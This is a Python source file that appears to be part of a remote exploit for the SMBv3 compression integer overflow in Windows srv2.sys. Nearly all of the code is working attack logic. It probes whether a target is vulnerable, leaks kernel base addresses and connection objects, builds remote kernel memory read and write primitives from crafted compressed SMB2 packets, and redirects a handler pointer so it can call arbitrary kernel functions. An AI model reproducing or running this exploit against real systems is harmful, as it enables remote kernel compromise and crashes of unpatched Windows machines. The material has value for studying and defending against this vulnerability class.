import os
import sys
import time
import struct
import threading
import socket

from cfg import *
from defs import *
from mdl import *
from smb import *
from smb_ntlm import *
from lznt1 import *

import vars

LOOKASIDE_LIST_SIZES = [0x1100, 0x2100, 0x4100, 0x8100, 0x10100, 0x20100, 0x40100, 0x80100, 0x100100]

ofs_SRVNET_BUFFER_HDR_BufferFlags					= 0x10
ofs_SRVNET_BUFFER_HDR_pNetRawBuffer					= 0x18
ofs_SRVNET_BUFFER_HDR_pNonPagedPoolAddr				= 0x30
ofs_SRVNET_BUFFER_HDR_pMDL1							= 0x38
ofs_SRVNET_BUFFER_HDR_pMDL2							= 0x50
ofs_SRVNET_BUFFER_HDR_pSrvNetWskStruct				= 0x58
ofs_SRVNET_BUFFER_HDR_MDL1							= 0x90

SRV2_BASE = None

CONNECTION_ID = 0

NETWSK_HANDLER_TABLE_PTR = None
NETWSK_ARGUMENT_1 = None

lock = threading.Lock()

def IsTargetVulnerable( ip, port ):
	try:
		sock = SMB2_Connect( ip, port )
	except socket.error as e:
		#print( e )
		return None

	try:
		buf = SMB2_NegotiateEx( sock, compressed = True )

		s = SMB2_BuildSessionSetupPacket( 1, pad = b'\x00' * (0x1100 - 110 + 0x10) ) + b'\x41'
		s = SMB2_BuildCompressedPacket( s, compress( b'\x41\x41\x41' ), 0xffffffff )
		s = SMB2_TcpWrapPacket( s )

		sock.send( s )

		buf = sock.recv( 0x1000 )

		#ok = len( buf ) > 0 
		ok = buf[4:8] == b"\xfcSMB" or buf[4:8] == b"\xfeSMB"
	except Exception as e:
		#print( e )
		ok = False

	sock.close()

	return ok

def LeakSrv2Base( ip, port ):
	global SRV2_BASE

	while True:
		print( "# leaking SRV2.SYS base address...", end = '', flush = True )

		srv2base, rva1, rva2, buf_spoiled = TryLeakSrv2Base( ip, port, SRV2BASE_LEAK_TIMEOUT )
		if srv2base != None:
			break

		if not buf_spoiled:
			print( '' )
			sys.exit( "[-] the target machine %s:%u seems not to be vulnerable as well" % (ip, port) )

		print( ' failed, retrying' )

		FixSpoiledBuffers( ip, port, 0x1100 )

	SRV2_BASE = srv2base

	print( '' )
	print( '  - got SRV2.SYS base address: 0x%016X' % srv2base )
	print( '  - got SRV2.SYS RVA 1: 0x%08X' % rva1 )
	print( '  - got SRV2.SYS RVA 2: 0x%08X' % rva2 )

	FixSpoiledBuffers( ip, port, 0x1100 )

	if rva1 == 0x1030 and rva2 == 0x5BBF0:
		vars.ofs_SRV2_imp_KeInitializeDpc			= 0x415e0
		vars.ofs_SRV2_imp_RtlCopyUnicodeString		= 0x41590
	else:
		sys.exit( "[-] unsupported SRV2.SYS version" )

	return srv2base

def TryLeakSrv2Base( ip, port, timeout ):
	new_mdl = BuildMDLHeader( MDL_MAP_VA, 4, 0x50 + 0x1100 )

	srv2base = None

	rva1 = None
	rva2 = None

	buf_spoiled = False

	ts = time.time()

	def thread_func():
		nonlocal srv2base, rva1, rva2, buf_spoiled

		sock = None

		while True:
			with lock:
				if srv2base != None:
					break

			try:
				ModifyBufferHeader( ip, port, 0x1100, ofs_SRVNET_BUFFER_HDR_MDL1, new_mdl )

				sock = SMB2_Connect( ip, port )
		
				buf = SMB2_NegotiateEx( sock, compressed = True, salt_size = SMB2_NEGOTIATE_SALT_SIZE )

				workstation = b'abcd'

#				ss = SMB2_BuildNtlmSessionSetupPacket( 2, extra_data = b'\x41' * (0x1100 - 0x80 + 0x10) )
				ss = SMB2_BuildNtlmSessionSetupPacket( 2, extra_data = workstation, pad = b'\x41' * (0x1100 - 0x80 - len( workstation ) + 0x10) )

				assert len( ss ) > 0x1100

				ss = SMB2_BuildCompressedPacket( b'', compress( ss ), len( ss ) )

				next_ofs = 0x1100 - 0x58 + 0x10

				s = SMB2_BuildNtlmSessionSetupPacket( 1, extra_data = workstation, next_offset = next_ofs ) + b'\x41'

				assert len( s ) - 1 <= 0x1100

				s = SMB2_BuildCompressedPacket( s, compress( b'\x41\x41\x41' ), 0xffffffff )

				s += b'\x00' * (next_ofs - len( s ))
			
				s += ss

				assert len( s ) > 0x1100
				assert len( s ) <= 0x2100

				s = SMB2_TcpWrapPacket( s )

				sock.send( s )

				buf = sock.recv( 0x1000 )
				
				sock.close()
				sock = None

				base = None

				while True:
					if buf[4:8] == b"\xfcSMB" or buf[4:8] == b"\xfeSMB":
						break

					buf_spoiled = True

					if 0:
						DumpBuf( buf, 0x50 )

					if len( buf ) < 8*7:
						break

					if struct.unpack( '<Q', buf[8:8+8] )[0] != 0x0000000100000000:
						break

					if struct.unpack( '<Q', buf[8*2:8*2+8] )[0] != 0x0000000000004000:
						break
	
					srv2_addr_1 = struct.unpack( '<Q', buf[8*3:8*4] )[0]

					if srv2_addr_1 <= 0xffff000000000000:
						break

					if (srv2_addr_1 & 0xffff) >= 0x2000:
						break

					srv2_addr_2 = struct.unpack( '<Q', buf[8*4:8*5] )[0]

					if not (srv2_addr_2 > srv2_addr_1 and srv2_addr_2 - srv2_addr_1 < 0xffffff):
						break

					if struct.unpack( '<Q', buf[8*5:8*6] )[0] != 0:
						break
					if struct.unpack( '<Q', buf[8*6:8*7] )[0] != 0:
						break

					base = srv2_addr_1 & ~0xffff
					break

				if base != None:
					with lock:
						if srv2base == None:
							srv2base = base

							rva1 = srv2_addr_1 - base
							rva2 = srv2_addr_2 - base
					break

				print( ".", end = '', flush = True )
			except Exception as e:
				if sock != None:
					sock.close()
					sock = None

				with lock:
					print( e )

				time.sleep( 0.1 )

			if time.time() - ts > timeout:
				break

	threads = []

	num_threads = NUM_THREADS

	for _ in range( num_threads - 1 ):
		t = threading.Thread( target = thread_func )
		threads.append( t )
		t.start()

	thread_func()

	for t in threads:
		t.join()

	return srv2base, rva1, rva2, buf_spoiled

def LeakConnectionObject( ip, port, buf_size, silent = False ):
	global CONNECTION_ID

	if not silent:
		print( "# leaking connection object...", end = '', flush = True )

	bigger_buf_size = buf_size * 2 - 0x100

	#
	# Exploit integer overflow to copy our buffer + buffer header to a bigger buffer
	#
	
	sock = SMB2_Connect( ip, port )
	
	buf = SMB2_NegotiateEx( sock, compressed = True )

	conn_id = CONNECTION_ID
	
	CONNECTION_ID += 1

	leak_pat_len = 16

	above_buf_len = ofs_SRVNET_BUFFER_HDR_MDL1 + ofs_MDL_Reserved + 2

	# Important: 16-bit WORD at this offset (&MDL.Reserved + 2) must be zero,
	# so that LZNT1 decompressor thinks this is the last chunk and stops
	src_leak_ofs = buf_size + above_buf_len - 0x10

	dst_leak_ofs = buf_size - leak_pat_len - 0x10

	bias = 0x18

	new_mdl = BuildMDLHeader( MDL_MAP_VA, 0x50 + dst_leak_ofs - bias + 4, 0x50 + bigger_buf_size )

	msg_id = 0

	netwsk_ptr = None
	buf_ptr = None
	buf_flags = None

	ts = time.time()

	while True:
		#
		# Spoil bigger buffer MDL
		#

		ModifyBufferHeader( ip, port, bigger_buf_size, ofs_SRVNET_BUFFER_HDR_MDL1, new_mdl )

		#
		# Copy buffer header to a bigger buffer
		#
		
		msg_id += 1
		
		leak_pat = b'\x55' * (leak_pat_len - 4) + struct.pack( '<HH', conn_id, msg_id )

		# Data will be appended to the session setup request
		req_tail = b'\x00' * (buf_size - 0x58 - 0x10 - leak_pat_len ) + leak_pat

		s = SMB2_BuildSessionSetupPacket( msg_id, pad = req_tail, pad_size_extra = above_buf_len )

		assert len( s ) + above_buf_len == src_leak_ofs

		s = SMB2_BuildCompressedPacketHeader( s, src_leak_ofs, 0 )

		# The request will go to the buf_size lookaside list
		assert len( s ) == buf_size

		s = SMB2_TcpWrapPacket( s )

		sock.send( s )

		buf = sock.recv( 0x1000 )

		while True:
			if buf[bias:bias + len( leak_pat )] != leak_pat:
				break

			buf = buf[bias + len( leak_pat ):]

			ptr1 = struct.unpack( '<Q', buf[0:8] )[0]
			ptr2 = struct.unpack( '<Q', buf[8:8 + 8] )[0]

			if ptr1 != ptr2:
				break

			if ptr1 <= 0xffff000000000000:
				break

			if (ptr1 & 0xf) != 8:
				break

			buf_ptr = struct.unpack( '<Q', buf[ofs_SRVNET_BUFFER_HDR_pNetRawBuffer:ofs_SRVNET_BUFFER_HDR_pNetRawBuffer + 8] )[0]
			if buf_ptr <= 0xffff000000000000:
				break

			buf_flags = struct.unpack( '<Q', buf[ofs_SRVNET_BUFFER_HDR_BufferFlags:ofs_SRVNET_BUFFER_HDR_BufferFlags + 8] )[0]
					
			netwsk_ptr = ptr1 - 0x58
			buf_ptr = buf_ptr
			buf_flags = buf_flags

			break

		if netwsk_ptr != None:
			break

		print( ".", end = '', flush = True )

		if time.time() - ts >= READ_TIMEOUT:
			print( '' )
			sys.exit( "[-] failed to leak connection object" )

	if not silent:
		print( '' )
		print( '  - got SRVNET_RECV pointer: 0x%016X' % netwsk_ptr )
		print( '  - got BUFFER address: 0x%016X' % buf_ptr )
		print( '  - got BUFFER flags: 0x%016X' % buf_flags )

	return sock, netwsk_ptr, buf_ptr, conn_id, msg_id

def CallFunction( ip, port, func_ptr_addr, arg1 = None, arg2 = None, desc = None, reading = False, initial = False ):
	global NETWSK_HANDLER_TABLE_PTR, NETWSK_ARGUMENT_1
	
	buf_size = 0x4100
	buf_ofs = 0x800

	num_attempts = 3

	while True:
		try:
			sock, netwsk_ptr, buf_ptr, conn_id, msg_id = LeakConnectionObject( ip, port, buf_size, desc == None )
			break
		except ConnectionResetError as e:
			num_attempts -= 1
			if num_attempts <= 0:
				raise e
			print( '' )

	WriteRemoteMemory( ip, port, struct.pack( '<L', 0x00ffffff ), netwsk_ptr + 4 )

	if NETWSK_HANDLER_TABLE_PTR == None and not initial:
		buf_ptr = ReadRemoteMemory( ip, port, netwsk_ptr + 0x118, 8 * 3, desc = "NETWSK values", initial = True )

		print( '  - got NETWSK handler table pointer: 0x%016X' % NETWSK_HANDLER_TABLE_PTR )
		print( '  - got NETWSK argument 1: 0x%016X' % NETWSK_ARGUMENT_1 )

	if desc != None:
		if not reading:
			print( "# %s..." % desc, end = '', flush = True )
		elif RESTORE_CRITICAL_STRUCTS:
			print( "# preparing...", end = '', flush = True )

	#
	# Fetch and save the NETWSK 2nd argument original value
	#	

	if arg2 != None and RESTORE_CRITICAL_STRUCTS:
		sign = b'\x78\xA2\x93' + struct.pack( '<H', conn_id ) + b'\xB1\xC7\xEE'

		data_size = 0x20

		PrepareBuffer( ip, port, data_size, sign, buf_ptr + buf_ofs )

		WriteRemoteMemory( ip, port, struct.pack( '<Q', SRV2_BASE + vars.ofs_SRV2_imp_KeInitializeDpc - 0x08 ), netwsk_ptr + 0x118 )
		WriteRemoteMemory( ip, port, struct.pack( '<Q', buf_ptr + buf_ofs + len( sign ) ), netwsk_ptr + 0x128 )

		ntlm_negotiate = Smb2NtlmAuthenticate( timestamp = b't1m3$t4m' ).get_packet()
	
		s = SMB2_BuildSessionSetupPacket( message_id = msg_id, session_id = 1234, sec_buf = ntlm_negotiate )
		s = SMB2_BuildCompressedPacketHeader( s, len( s ), 0 )
	
		assert len( s ) <= 0x1100

		s = SMB2_TcpWrapPacket( s )
	
		sock.send( s )

		res = FindLeakedData( ip, port, data_size, sign, buf_ptr, buf_ofs, buf_size )

		saved_netwsk_arg2 = struct.unpack( '<Q', res[0x18:] )[0]

		if desc != None:
			print( '' )
			print( '  - got NETWSK argument 2: 0x%016X' % saved_netwsk_arg2 )

	#
	# Execute target function or read memory
	#

	if reading:
		addr = arg1
		size = arg2

		sign = b'\xAE\x3B\xA1' + struct.pack( '<H', conn_id ) + b'\x3D\x4A\x3B'

		assert buf_ofs >= 0x208

		PrepareBuffer( ip, port, size, sign, buf_ptr + buf_ofs )

		s = b''

		# Target UNICODE_STRING
		s += struct.pack( '<HHLQ', size, size, 0, buf_ptr + buf_ofs + len( sign ) )

		# Source UNICODE_STRING
		s += struct.pack( '<HHLQ', size, size, 0, addr )

		unicode_strings_ptr = buf_ptr + buf_size - 2 * 16

		nap_va = unicode_strings_ptr - 0x210

		WriteRemoteMemory( ip, port, s, unicode_strings_ptr )

		arg1 = unicode_strings_ptr + 0 * 16
		arg2 = unicode_strings_ptr + 1 * 16

	WriteRemoteMemory( ip, port, struct.pack( '<Q', func_ptr_addr - 0x10 ), netwsk_ptr + 0x118 )

	if arg1 == None:
		if arg2 != None:
			WriteRemoteMemory( ip, port, struct.pack( '<Q', arg2 ), netwsk_ptr + 0x130 )
	elif arg2 == None:
		WriteRemoteMemory( ip, port, struct.pack( '<Q', arg1 ), netwsk_ptr + 0x128 )
	else:
		WriteRemoteMemory( ip, port, struct.pack( '<QQ', arg1, arg2 ), netwsk_ptr + 0x128 )

	sock.shutdown( socket.SHUT_RDWR )

	if not reading:
		if desc != None:
			print( ' done', flush = True  )
		res = None
	else:
		if desc != None:
			print( "# leaking fetched memory...", end = '', flush = True )

		res = FindLeakedData( ip, port, size, sign, buf_ptr, buf_ofs, buf_size, desc )

		if initial:
			NETWSK_HANDLER_TABLE_PTR = struct.unpack( '<Q', res[0:8] )[0]
			NETWSK_ARGUMENT_1 = struct.unpack( '<Q', res[0x10:0x18] )[0]

			res = buf_ptr

	WriteRemoteMemory( ip, port, struct.pack( '<Q', NETWSK_HANDLER_TABLE_PTR ), netwsk_ptr + 0x118 )

	if not RESTORE_CRITICAL_STRUCTS:
		saved_netwsk_arg2 = 0

	if arg1 == None:
		if arg2 != None:
			WriteRemoteMemory( ip, port, struct.pack( '<Q', saved_netwsk_arg2 ), netwsk_ptr + 0x130 )
	elif arg2 == None:
		WriteRemoteMemory( ip, port, struct.pack( '<Q', NETWSK_ARGUMENT_1 ), netwsk_ptr + 0x128 )
	else:
		WriteRemoteMemory( ip, port, struct.pack( '<QQ', NETWSK_ARGUMENT_1, saved_netwsk_arg2 ), netwsk_ptr + 0x128 )

	sock.close()

	return res

def PrepareBuffer( ip, port, size, sign, data_ptr ):
	WriteRemoteMemory( ip, port, sign + b'\x00' * size, data_ptr )

def FindLeakedData( ip, port, size, sign, buf_ptr, buf_ofs, buf_size, desc = None ):
	bias = 0x10

	ofs = buf_ofs - bias

	buf_top = buf_ptr + buf_size

	WriteRemoteMemory( ip, port, struct.pack( '<H', MDL_ALLOCATED_FIXED_SIZE | MDL_PARTIAL | MDL_NETWORK_HEADER | MDL_ALLOCATED_MUST_SUCCEED ), buf_top + ofs_SRVNET_BUFFER_HDR_MDL1 + ofs_MDL_Flags )
	WriteRemoteMemory( ip, port, struct.pack( '<LL', buf_size - ofs, 0x50 + ofs ), buf_top + ofs_SRVNET_BUFFER_HDR_MDL1 + ofs_MDL_ByteCount )

	ts = time.time()

	res = None

	def thread_func():
		nonlocal res

		sock = None

		while time.time() - ts < READ_TIMEOUT:
			with lock:
				if res != None:
					return

			try:
				sock = SMB2_Connect( ip, port )
		
				buf = SMB2_NegotiateEx( sock, compressed = True )

				smaller_buf_size = buf_size // 2 + 0x100

				n = smaller_buf_size
				
				s = SMB2_BuildSessionSetupPacket( 1, pad_size_extra = n )

				assert( len( s ) + n > smaller_buf_size )

				s = SMB2_BuildCompressedPacket( b'', compress( s ), len( s ) + n )

				assert( len( s ) <= 0x1100 )

				s = SMB2_TcpWrapPacket( s )

				sock.send( s )

				buf = sock.recv( 0x1000 )
				
				sock.close()
				sock = None

				c = '.'
				
				if buf[bias + 4:bias + 4 + len( sign )] == sign:
					ofs = bias + 4 + len( sign )

					subbuf = buf[ofs:ofs + size]

					assert len( subbuf ) == size

					if size <= 1 or subbuf != b'\x00' * size:
						with lock:
							if res == None:
								res = subbuf
							return

					c = '*'

				print( c, end = '', flush = True )

				if 0:
					with lock:
						if buf[4:8] != b"\xfcSMB" and buf[4:8] != b"\xfeSMB":
							DumpBuf( buf )
			except Exception as e:
				if sock != None:
					sock.close()
					sock = None

				with lock:
					print( e )

				time.sleep( 0.1 )

	threads = []

	num_threads = NUM_THREADS

	for _ in range( num_threads - 1 ):
		t = threading.Thread( target = thread_func )
		threads.append( t )
		t.start()

	thread_func()

	for t in threads:
		t.join()

#	WriteRemoteMemory( ip, port, struct.pack( '<H', 0 ), buf_top + ofs_SRVNET_BUFFER_HDR_BufferFlags )
	WriteRemoteMemory( ip, port, struct.pack( '<H', MDL_ALLOCATED_FIXED_SIZE | MDL_PARTIAL | MDL_NETWORK_HEADER | MDL_ALLOCATED_MUST_SUCCEED ), buf_top + ofs_SRVNET_BUFFER_HDR_MDL1 + ofs_MDL_Flags )
	WriteRemoteMemory( ip, port, struct.pack( '<LL', 0x50 + buf_size, 0x50 ), buf_top + ofs_SRVNET_BUFFER_HDR_MDL1 + ofs_MDL_ByteCount )

	if res == None:
		print( '' )
		sys.exit( "[-] memory read failure" )

	if len( res ) == 1:
		res = struct.unpack( '<B', res )[0]
		if desc != None:
			res_desc = '0x%02X' % res
	elif len( res ) == 2:
		res = struct.unpack( '<H', res )[0]
		if desc != None:
			res_desc = '0x%04X' % res
	elif len( res ) == 4:
		res = struct.unpack( '<L', res )[0]
		if desc != None:
			res_desc = '0x%08X' % res
	elif len( res ) == 8:
		res = struct.unpack( '<Q', res )[0]
		if desc != None:
			res_desc = '0x%016X' % res
	else:
		if desc != None:
			res_desc = ''
			for b in res:
				if len( res_desc ) > 0:
					res_desc += ' '
				res_desc += '0x%02X' % b

	if desc != None:
		print( '' )
		print( '  - got %s: %s' % (desc, res_desc) )

	return res

def ReadRemoteMemory( ip, port, addr, size, desc = None, initial = False ):
	return CallFunction( ip, port, SRV2_BASE + vars.ofs_SRV2_imp_RtlCopyUnicodeString, addr, size, desc = desc, reading = True, initial = initial )

def WriteRemoteMemory( ip, port, data, addr ):
	i = 0

	while True:
		if i >= len( LOOKASIDE_LIST_SIZES ):
			chunk_size = len( data )
			break

		chunk_size = LOOKASIDE_LIST_SIZES[i]

		if len( data ) - 1 <= chunk_size:
			break

		i += 1

	if chunk_size < len( data ):
		s = b"\x00" * (chunk_size + ofs_SRVNET_BUFFER_HDR_pNetRawBuffer - len( data ))
	else:
		s = b"\x41" * (chunk_size - len( data )) + b"\x00" * ofs_SRVNET_BUFFER_HDR_pNetRawBuffer

	s += struct.pack( '<Q', addr )

	s = SMB2_BuildCompressedPacket( data, compress( s ), 0xFFFFFFFF )
	s = SMB2_TcpWrapPacket( s )
 
	sock = SMB2_Connect( ip, port )

	SMB2_NegotiateEx( sock, compressed = True )

	sock.send( s )

	try:
		sock.recv( 1 )
	except:
		pass  # expected, ignore

	sock.close()

def ModifyBufferHeader( ip, port, buf_size, ofs, data ):
	sock = None

	try:
		sock = SMB2_Connect( ip, port )

		SMB2_NegotiateEx( sock, compressed = True, salt_size = 12 if buf_size > 0x1100 else SMB2_NEGOTIATE_SALT_SIZE )

		s = SMB2_BuildCompressedPacket( b'\x00' * (buf_size + ofs), compress_evil( data ), 0xffffffff - ofs )

		s = SMB2_TcpWrapPacket( s )

		sock.send( s )
	except Exception as e:
		if sock != None:
			sock.close()
		raise e

	try:
		sock.recv( 1 )
	except:
		pass  # expected, ignore

	sock.close()

def FinalCleanup( ip, port):
	FixSpoiledBuffers( ip, port, 0x8100 )

def FixSpoiledBuffers( ip, port, buf_size, silent = False ):
	ofs = ofs_SRVNET_BUFFER_HDR_BufferFlags
	data = struct.pack( '<H', 0 )

	FixSpoiledBuffersEx( ip, port, buf_size, ofs, data, silent )

def FixSpoiledBuffers2( ip, port, buf_size, silent = False ):
	ofs = ofs_SRVNET_BUFFER_HDR_MDL1 + ofs_MDL_ByteCount
	data = struct.pack( '<LL', buf_size, 0x50 )

	FixSpoiledBuffersEx( ip, port, buf_size, ofs, data, silent )

def FixSpoiledBuffersEx( ip, port, buf_size, ofs, data, silent = False ):
	if not silent:
		print( "# fixing spoiled buffers of size 0x%X..." % buf_size, end = '', flush = True )

	last_bad_ts = time.time()

	good_count = 0

	def thread_func():
		nonlocal last_bad_ts, good_count

		sock = None

		while True:
			try:
				ModifyBufferHeader( ip, port, buf_size, ofs, data )

				sock = SMB2_Connect( ip, port )
		
				buf = SMB2_NegotiateEx( sock, compressed = True, salt_size = SMB2_NEGOTIATE_SALT_SIZE if buf_size < 0x1100 else 0 )

				if buf_size > 0x1100:

					smaller_buf_size = buf_size // 2 + 0x100

					n = smaller_buf_size
				
					s = SMB2_BuildSessionSetupPacket( 1, pad_size_extra = n )

					assert( len( s ) + n > smaller_buf_size )

					s = SMB2_BuildCompressedPacket( b'', compress( s ), len( s ) + n )

					assert( len( s ) <= 0x1100 )
				else:
					ss = SMB2_BuildNtlmSessionSetupPacket( 2, extra_data = b'\x41' * (0x1100 - 0x80 + 0x10) )

					assert len( ss ) > 0x1100

					ss = SMB2_BuildCompressedPacket( b'', compress( ss ), len( ss ) )

					next_ofs = 0x1100 - 0x58 + 0x10

					s = SMB2_BuildNtlmSessionSetupPacket( 1, next_offset = next_ofs ) + b'\x41'

					assert len( s ) - 1 <= 0x1100

					s = SMB2_BuildCompressedPacket( s, compress( b'\x41\x41\x41' ), 0xffffffff )

					s += b'\x00' * (next_ofs - len( s ))
			
					s += ss

					assert len( s ) > 0x1100
					assert len( s ) <= 0x2100

				s = SMB2_TcpWrapPacket( s )

				sock.send( s )

				buf = sock.recv( 0x1000 )

				sock.close()
				sock = None

				with lock:
					ts = time.time()

					if buf[4:8] != b"\xfcSMB" and buf[4:8] != b"\xfeSMB":
						if last_bad_ts < ts:
							last_bad_ts = ts

						good_count = 0

						continue

					good_count += 1

					if good_count >= BUFFER_FIX_COUNT_THRESHULD and ts - last_bad_ts >= BUFFER_FIX_TIME_THRESHULD:
						return

				print( ".", end = '', flush = True )
			except Exception as e:
				if sock != None:
					sock.close()
					sock = None

				with lock:
					print( e )

				time.sleep( 0.1 )

	threads = []

	num_threads = NUM_THREADS

	for _ in range( num_threads - 1 ):
		t = threading.Thread( target = thread_func )
		threads.append( t )
		t.start()

	thread_func()

	for t in threads:
		t.join()

	if not silent:
		print( ' done' )

def DumpBuf( buf, size = None ):
	if size == None or size > len( buf ):
		size = len( buf )

	print( 'BUF:' )

	size &= ~7

	for i in range( 0, size, 8 ):
		n = struct.unpack( '<Q', buf[i:i+8] )

		print( ' - 0x%016X' % n )
